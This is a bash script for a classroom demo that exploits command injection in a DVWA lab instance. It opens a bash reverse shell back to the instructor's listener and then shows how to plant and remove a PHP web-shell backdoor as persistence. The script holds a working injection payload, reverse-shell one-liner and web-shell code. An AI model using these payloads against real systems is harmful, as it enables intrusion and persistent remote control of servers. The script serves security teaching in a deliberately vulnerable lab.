#!/usr/bin/env bash
# Day 17 — Path B live demo: DVWA command injection -> reverse shell.
#
# HOW TO RUN THIS LIVE IN FRONT OF THE CLASS (two terminals, both inside WSL Ubuntu):
#
#   Terminal A (the "attacker" window students watch — leave it open and visible):
#       nc -lvnp 4444
#   Just leave that running. It will print "Connection received..." and then drop you
#   straight into a live shell prompt as www-data. You can type `id`, `whoami`, `ls`, etc.
#   right there in front of the class once it connects.
#
#   Terminal B (the "trigger" — this script):
#       bash demo-reverse-shell-dvwa.sh
#   This logs into DVWA and submits the Command Injection payload. It does NOT open its
#   own listener — it just fires the payload at the target so Terminal A catches the shell.
#
# What to say while it runs: "The Command Injection field just took one string and handed it
# to the shell on the server. I put a semicolon after a harmless ping, then told it to open a
# shell back to me. That's it — no malware, no binary, just text in a form field."
#
# Why `bash -c '...'` and not the usual `nc -e /bin/sh`: this DVWA image's default shell is
# `dash`, which can't do `/dev/tcp`, and the image has no `nc` binary at all. So the payload
# explicitly calls `bash -c` to get a real bash with /dev/tcp support.
#
# Why 10.89.1.1 and not your WSL IP: the DVWA container only has a route to the lab bridge
# (10.89.1.0/24); 10.89.1.1 is THIS machine's address on that bridge — the address the
# container can actually reach you on.
#
# Verified against this lab 2026-10-05: DVWA 10.89.1.20, attacker-reachable IP 10.89.1.1.

set -u
DVWA_HOST="10.89.1.20"
ATTACKER_IP="10.89.1.1"
PORT="4444"
JAR="$(mktemp)"

echo "[*] Make sure Terminal A is running:  nc -lvnp $PORT"
echo "[*] Press ENTER once that listener is up and waiting ..."
read -r _

echo "[*] Logging into DVWA at http://$DVWA_HOST ..."
LOGIN_PAGE=$(curl -s -c "$JAR" "http://$DVWA_HOST/login.php")
TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token' value='\K[^']+")
curl -s -b "$JAR" -c "$JAR" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  "http://$DVWA_HOST/login.php" -o /dev/null
echo "[*] Logged in."

EXEC_PAGE=$(curl -s -b "$JAR" "http://$DVWA_HOST/vulnerabilities/exec/")
ETOKEN=$(echo "$EXEC_PAGE" | grep -oP "name='user_token' value='\K[^']+")

PAYLOAD="127.0.0.1; bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1 &'"
echo "[*] Submitting payload to the Command Injection field:"
echo "      $PAYLOAD"
curl -s -b "$JAR" --data-urlencode "ip=$PAYLOAD" -d "Submit=Submit&user_token=$ETOKEN" \
  "http://$DVWA_HOST/vulnerabilities/exec/" -o /dev/null

echo "[*] Done. Switch to Terminal A — it should now show a www-data@dvwa shell prompt."
rm -f "$JAR"

echo
echo "After you've shown the shell, plant + remove persistence (type these INSIDE Terminal"
echo "A's shell, not here — this container has no 'cron' or 'crontab' binary, so the"
echo "realistic persistence demo here is a dropped web-shell file instead):"
echo '    echo "<?php system(\$_GET[\"c\"]); ?>" > /var/www/html/zz_backdoor.php'
echo "    exit                         # leave the reverse shell"
echo "Then from any terminal (no exploit needed anymore — that's the point of persistence):"
echo "    curl \"http://$DVWA_HOST/zz_backdoor.php?c=id\""
echo "Then clean it up — don't leave it live:"
echo "    (back in a reverse shell, or via the same ?c= backdoor) rm /var/www/html/zz_backdoor.php"
